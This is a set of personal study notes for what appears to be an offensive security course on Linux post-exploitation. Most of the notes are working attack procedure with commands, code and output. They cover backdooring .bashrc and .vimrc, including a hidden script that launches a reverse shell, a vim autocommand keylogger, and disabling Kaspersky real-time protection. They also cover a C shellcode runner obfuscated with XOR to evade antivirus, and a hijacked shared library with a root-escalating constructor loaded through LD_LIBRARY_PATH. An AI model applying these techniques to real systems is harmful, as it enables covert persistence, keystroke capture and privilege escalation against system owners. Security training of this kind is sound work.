# Linux post exploitation

372

linux is used on server

# user configuration files

dotfiles

.bash_profile and .bashrc - to put environement variables and load scripts whene a user initially logs onto a system

```
 echo "touch /tmp/bashtest.txt" >> ~/.bashrc
```

# VIM Config Simple Backdoor

vimrc in .vimrc file comtains the configuration file for vim

`echo ":echo 'this is a test'" >> .vimrc`

`echo "!touch /tmp/test.txt" >> .vimrc`

we can source a shell script using the bash source command.

we can import other vim configuration files into users cuirrent duir with source command we add silent so that the script is not shown.

`echo ':silent !source ~/.vimrunscript' >> .vimrc`
we create a shell script file /home/offsec/.vimrunscript `echo "hacked" >  /tmp/hacksrcout.txt`

we can add alias into the .bashrc file

`echo 'alias sudo="sudo -E"' >> ~/.bashrc`

`source ~/.bashrc` for making effect the changes

we can look at file permission through 

`sudo -l`


### 10.1.1.1 Exercises
1. Backdoor VIM as described in the module by modifying the user’s .vimrc file directly and 
running a command while silencing the output.

2. Backdoor VIM by adding a script to the VIM plugins folder.

3. Backdoor VIM by sourcing a secondary shell script in the user’s .vimrc file while silencing the 
output.
4. Create an alias for the user for sudo to preserve the user’s environment and activate it by 
sourcing the user’s .bashrc file. Then execute a command as root by running VIM as sudo.
5. Using the linuxvictim user, run VIM via sudo and get a root shell using the :shell command.

all exercises done

### 10.1.1.2 Extra Mile
Get a reverse shell using the above VIM backdoor as root.

```sh
└─$ cat vimrunscript 
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
~/reverse.elf 
```

```sh
┌──(kali㉿kali)-[~]
└─$ cat .vimrc
:silent !source ~/vimrunscript  
```

# vim config keylogger

we leverage autocommands 
:autocmd

`:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt`

we can also add it in 

` /home/offsec/.vim/plugin/settings.vim`

we can put an if condition

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

### 10.1.2.1 Exercises
1. Use an autocommand call to write a simple VIM keylogger and silence it as in this section, 
sourcing it from a separate file than the user’s .vimrc file.

2. Modify the keylogger to only log modified file contents if the user is root

# bypassing AV

linux kaspersky

# Kaspersky Endpoint security

it can be installed from : https://www.kaspersky.com/small-to-medium-business-security/downloads/endpoint?icid=gl_sup-site_trd_ona_oth__onl_b2b_klsupport_tri-dl____kes___

`dpkg -i kesl-10.1.0-<build number>_i386.deb`

note: instlalation need to be of simple kesl endpoint secuity and not web console.

We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
which stops a specified task number

`sudo kesl-control --stop-t 1`

We can turn Kaspersky off using the kesl-control utility. We need to use the --stop-t flag, 
which stops a specified task number. The documentation indicates that real-time protection runs 
as task number 1

`sudo gpg -d eicar.txt.gpg > eicar.txt`

`sudo kesl-control --scan-file ./eicar.txt`

`sudo kesl-control -E --query | grep DetectName`

394
Things done to evade basic c code 

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Our payload generated by msfvenom
unsigned char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"....\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

int main (int argc, char **argv) 
{
 // Run our shellcode
 int (*ret)() = (int(*)())buf;
 ret();
}
```

1. we tried xor
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
unsigned char buf[] = 
"\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff\x6a\x3c"
"\x58\x0f\x05\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31"


int main (int argc, char **argv) 
{
 char xor_key = 'J';
 int payload_length = (int) sizeof(buf);
 for (int i=0; i<payload_length; i++)
 {
 printf("\\x%02X",buf[i]^xor_key);
 }
 return 0;
}
```

` gcc -o encoder.out encoder.c`

### 10.2.2.1 Exercises
1. Bypass Kaspersky by running a shell in a C wrapper program as shown in this section.
2. Bypass the other scanners in Antiscan.me using XOR obfuscation as shown in this section.
   
no license of kaspersky

# Shared libraries

a elf binary looks at poath from these locations

1. Directories listed in the application’s RPATH595 value.
2. Directories specified in the LD_LIBRARY_PATH environment variable.
3. Directories listed in the application’s RUNPATH596 value.
4. Directories specified in /etc/ld.so.conf.
5. System library directories: /lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64, and 
potentially others.

# shared library hijacking using LD_Library_path

After checking its internal RPATH values for hard coded paths, it then checks for an 
environment variable called LD_LIBRARY_PATH. Setting this variable allows a user to override the 
default behavior of a program and insert their own versions of libraries

we can inser a line in .bashrc or .bash_profile to define a LD_LIBRARY_PATH

 This setting is configured in the 
/etc/sudoers file by using the env_reset keyword as a default. Some systems are configured to 
allow a user’s environment to be passed on to sudo. These will have env_keep set instead.

We could bypass the env_reset setting with our previously-mentioned .bashrc alias for the sudo 
command. We mentioned this approach earlier when we set the sudo command to sudo -E in 
Listing 443. As a normal user, it’s not typically possible to read /etc/sudoers to know if env_reset
is set, so it may be useful to create this alias setting regardless.

Example of a malicious C program

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
 setuid(0);
 setgid(0);
 printf("DLL HIJACKING IN PROGRESS \n");
 system("touch /tmp/haxso.txt");
}
```

`gcc -Wall -fPIC -c -o hax.o hax.c`

this will give us the object code
converting it into a shared library file:

`gcc -shared -o libhac.s hax.o`

This produces a libhax.so shared library file.
One important thing to note is that shared libraries in Linux use the soname602 naming 
convention. This is typically something like lib.so, which may also include a version number 
appended to the end with a period or full-stop character. For example, we might see lib.so.1. 
Naming our libraries following this convention will help us with the linking process

now we need to put this library to use when malicious program is run.

we will look at `/usr/bin/top`
ldd will give the loaded library when a program is run.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ldd /usr/bin/top
        linux-vdso.so.1 (0x00007fff6f041000)
        libprocps.so.8 => /lib/x86_64-linux-gnu/libprocps.so.8 (0x00007f382981e000)
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f38297ed000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3829613000)
        libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007f3829543000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f382953c000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f38298c1000)
        librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007f3829531000)
        liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007f3829507000)
        libzstd.so.1 => /lib/x86_64-linux-gnu/libzstd.so.1 (0x00007f382944e000)
        liblz4.so.1 => /lib/x86_64-linux-gnu/liblz4.so.1 (0x00007f382942b000)
        libcap.so.2 => /lib/x86_64-linux-gnu/libcap.so.2 (0x00007f3829420000)
        libgcrypt.so.20 => /lib/x86_64-linux-gnu/libgcrypt.so.20 (0x00007f38292e5000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f38292c4000)
        libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007f382929a000)
                                                                        
```

We set our environment variable for LD_LIBRARY_PATH and rename our .so file to match the one 
we’re hijacking.

```
                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ cp libhac.so libgpg-error.so.0
                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ top
top: /home/kali/Downloads/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: symbol lookup error: /lib/x86_64-linux-gnu/libgcrypt.so.20: undefined symbol: gpgrt_lock_lock, version GPG_ERROR_1.0

```

Unfortunately, we have a problem. The error message states that we’re missing the symbol 
gpgrt_lock_lock with a version of GPG_ERROR_1.0. The program has not yet run our library’s 
constructor, but it’s already giving an error that we’re missing symbols.605
This means that certain variables or functions that the program expects to find when loading the 
original library have not been defined in our malicious library. As a result, the program won’t even 
attempt to run our library’s constructor. Fortunately, this is fairly easy to fix.
When loading a library, a program only wants to know that our library contains symbols of that 
name. It doesn’t care anything about validating their type or use. Because of that, we can simply 
define some variables with the same names that it expects and top should run.
We have an additional advantage in that the original shared library exists on the file system. Let’s 
examine it and determine what symbols it contains using the readelf606 utility. The -s parameter 
will give a list of available symbols in the library

getting the variables that are not defined in a elf file

`readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 
| grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
int gpgrt_ftruncate;
int gpgrt_logv;
int gpgrt_strdup;
int gpgrt_printf_unlocked;
...
int gpgrt_bsprintf;
int gpgrt_fname_set;
int gpgrt_tmpfile;
int gpgrt_get_nonblock;
int gpgrt_fpopen_nc;
int gpgrt_fopenmem_init;
int gpgrt_mopen;
int gpg_error_check_version;
int gpgrt_fseek;

```

we add all these variables to C code -

```C

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
static void runmahpayload() __attribute__((constructor));

int gpgrt_ftruncate;
int gpgrt_logv;
int gpgrt_strdup;
int gpgrt_printf_unlocked;
int gpgrt_ftello;
int gpg_err_code_to_errno;
int gpgrt_log_printhex;
int gpgrt_log_bug;
int gpgrt_write_hexstring;
int gpgrt_b64enc_finish;
int gpgrt_b64enc_write;
int gpgrt_fileno_unlocked;
int gpgrt_set_strusage;
int gpgrt_ftell;
int gpgrt_argparser;
int gpgrt_b64dec_finish;
int gpgrt_asprintf;
int gpg_strerror;
int gpgrt_lock_init;
int gpgrt_log_debug_string;
int gpgrt_ftrylockfile;
int gpgrt_realloc;
int _gpgrt_log_assert;
int gpgrt_fopen;
int gpgrt_strconcat;
int gpgrt_sysopen_nc;
int _gpgrt_pending_unlocked;
int gpgrt_getline;
int gpgrt_vbsprintf;
int gpgrt_log_fatal;
int gpgrt_fname_get;
int gpgrt_fflush;
int gpgrt_read;
int gpgrt_log_debug;
int gpgrt_yield;
int gpgrt_log_clock;
int gpg_err_code_from_errno;
int gpgrt_vfprintf_unlocked;
int gpgrt_fopencookie;
int gpgrt_b64dec_start;
int gpgrt_log_get_stream;
int gpgrt_inc_errorcount;
int gpgrt_sysopen;
int gpgrt_write_sanitized;
int gpgrt_getenv;
int gpgrt_ungetc;
int gpgrt_log_get_fd;
int gpgrt_ferror_unlocked;
int _gpgrt_get_std_stream;
int gpgrt_logv_prefix;
int gpgrt_fprintf_sf_unlocked;
int gpgrt_get_syscall_clamp;
int gpgrt_clearerr;
int gpg_err_init;
int gpgrt_vasprintf;
int gpgrt_funlockfile;
int gpgrt_free;
int gpgrt_log_info;
int gpgrt_log_set_sink;
int gpgrt_syshd_unlocked;
int gpgrt_log_get_prefix;
int gpgrt_malloc;
int gpg_strerror_r;
int gpg_err_deinit;
int gpgrt_log;
int gpgrt_set_alloc_func;
int gpgrt_clearerr_unlocked;
int gpgrt_rewind;
int gpgrt_set_usage_outfnc;
int gpg_strsource;
int gpgrt_fprintf_unlocked;
int gpgrt_check_version;
int gpgrt_fpopen;
int gpgrt_ferror;
int gpgrt_set_confdir;
int gpgrt_fdopen;
int gpgrt_fileno;
int gpgrt_setbuf;
int gpgrt_lock_trylock;
int gpgrt_freopen;
int gpgrt_poll;
int gpgrt_fprintf_sf;
int gpgrt_add_emergency_cleanup;
int gpgrt_b64enc_start;
int gpgrt_onclose;
int gpgrt_absfnameconcat;
int gpgrt_access;
int gpgrt_fprintf;
int gpgrt_log_set_prefix;
int gpgrt_set_nonblock;
int gpgrt_fopenmem;
int gpgrt_snprintf;
int gpgrt_argparse;
int gpgrt_log_set_socket_dir_cb;
int gpgrt_set_binary;
int _gpgrt_getc_underflow;
int gpgrt_opaque_set;
int gpgrt_get_errorcount;
int gpgrt_fread;
int gpgrt_log_flush;
int gpgrt_flockfile;
int gpgrt_chdir;
int gpgrt_feof_unlocked;
int gpgrt_fputs_unlocked;
int _gpgrt_set_std_fd;
int gpgrt_usage;
int gpgrt_vsnprintf;
int _gpgrt_pending;
int _gpgrt_putc_overflow;
int gpgrt_log_test_fd;
int gpgrt_strusage;
int gpgrt_abort;
int gpgrt_fputc;
int gpgrt_fseeko;
int gpgrt_set_syscall_clamp;
int gpgrt_fclose_snatch;
int gpgrt_cmp_version;
int gpgrt_fgetc;
int gpgrt_log_string;
int gpgrt_fwrite;
int gpgrt_setenv;
int gpgrt_lock_unlock;
int gpgrt_write;
int gpgrt_getcwd;
int gpgrt_calloc;
int gpgrt_fclose;
int gpgrt_b64dec_proc;
int gpgrt_feof;
int gpgrt_log_set_pid_suffix_cb;
int gpgrt_fnameconcat;
int gpgrt_printf;
int gpgrt_setvbuf;
int gpgrt_lock_lock;
int gpgrt_opaque_get;
int gpgrt_log_printf;
int gpgrt_reallocarray;
int gpgrt_fputs;
int gpgrt_syshd;
int gpgrt_lock_destroy;
int gpgrt_set_fixed_string_mapper;
int gpgrt_vfprintf;
int gpgrt_log_error;
int gpgrt_fgets;
int gpgrt_fdopen_nc;
int gpgrt_fcancel;
int gpg_err_code_from_syserror;
int gpgrt_mkdir;
int gpgrt_read_line;
int gpg_err_set_errno;
int gpgrt_bsprintf;
int gpgrt_fname_set;
int gpgrt_tmpfile;
int gpgrt_get_nonblock;
int gpgrt_fpopen_nc;
int gpgrt_fopenmem_init;
int gpgrt_mopen;
int gpg_error_check_version;
int gpgrt_fseek;

void runmahpayload() {
 setuid(0);
 setgid(0);
 printf("DLL HIJACKING IN PROGRESS \n");
 system("touch /tmp/haxso.txt");
}
```

after making the chang eand compiuling the program we ave - 

```
└─$ top
top: /home/kali/Downloads/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
DLL HIJACKING IN PROGRESS 
top - 07:00:24 up 1 day,  1:08,  2 users,  load average: 0.35, 0.36, 0.35
Tasks: 261 total,   1 running, 255 sleeping,   5 stopped,   0 zombie
%Cpu(s):  4.4 us,  3.9 sy,  0.0 ni, 91.2 id,  0.0 wa,  0.0 hi,  0.5 si,  0.0 st
MiB Mem :   7947.6 total,    504.6 free,   3310.8 used,   4132.2 buff/cache
MiB Swap:    975.0 total,    975.0 free,      0.0 used.   4193.8 avail Mem 

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                               
  18871 kali      20   0 3197516 390864 192476 S  30.6   4.8 107:04.60 Web Content                                           
 287084 kali      20   0  420528  93120  74164 S   2.3   1.1   0:08.12 qterminal                                             
  18584 kali      20   0 4111312 836936 256788 S   2.0  10.3  20:54.54 firefox-esdotnetcli
```

we can also try and use a map symbol we will simply extract all symbols without the int sign this time

`export LD_LIBRARY_PATH=/home/kali/Downloads`

`readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 
| grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'`

after enclosing them in a `GPG_ERROR_1.0 {}`  we can see that

```
──(kali㉿kali)-[~/Downloads]
└─$ gcc -Wall -fPIC -c -o hax.o hax.c
                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o
                                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ top


┌──(kali㉿kali)-[~/Downloads]
└─$ ls -al /tmp/haxso.txt
-rw-r--r-- 1 kali kali 0 Jul 25 07:07 /tmp/haxso.txt
                                                        
```

Earlier, we discussed how in modern Linux distributions a user’s environment variables aren’t 
normally passed to a sudo context. To get around this, we created an alias for sudo in the user’s 
.bashrc file replacing sudo with sudo -E. However, some environment variables are not passed 
even with this approach. Unfortunately, LD_LIBRARY_PATH is one of these. If we try to run top
with sudo, our module is not run.

```dotnetcli
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo top                                                
[sudo] password for kali: 
top - 07:11:28 up 1 day,  1:19,  3 users,  load average: 0.39, 0.50, 0.44
Tasks: 252 total,   2 running, 245 sleeping,   5 stopped,   0 zombie
%Cpu(s):  1.3 us,  3.3 sy,  0.0 ni, 94.4 id,  0.0 wa,  0.0 hi,  1.0 si,  0.0 st
MiB Mem :   7947.6 total,    842.0 free,   2990.4 used,   4115.3 buff/cache

```

so instad we can trye and explicitly force that alias sudo uses LD_LIBRARY_PATH

this gives an error. so I realise i actually have to make changes to ~/.zshrc

### 10.3.2.1 Exercises
1. Create a malicious shared library example as shown in this section and run it using 
LD_LIBRARY_PATH and the top utility

2. 2. Create a .bashrc alias for sudo to include LD_LIBRARY_PATH and use the malicious library 
example we created to escalate to root privileges.

### 10.3.2.2 Extra Mile
1. Get a shell by adding shellcode execution to our shared library example. Consider using the 
AV bypass code we covered previously as a guide. Continuing the program’s functionality 
after the shell is fired is not necessary in this case.

2. Hijack an application other than top using the method described in this section

# Exploit via LD_PRELOAD











